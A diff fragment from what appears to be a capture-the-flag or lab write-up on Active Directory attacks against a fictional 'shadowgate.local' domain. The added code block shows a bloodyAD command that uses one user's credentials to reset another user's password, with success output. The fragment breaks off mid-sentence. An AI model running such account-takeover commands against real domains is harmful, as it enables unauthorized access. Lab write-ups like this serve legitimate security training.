@@ -665,4 +665,9 @@ bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Pass
 
 Now the user is restored
 
-``
+```python
+bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Password123!' set password 'sam.h' 'Password123!'
+[+] Password changed successfully!
+```
+
+And since i have full control ill chan
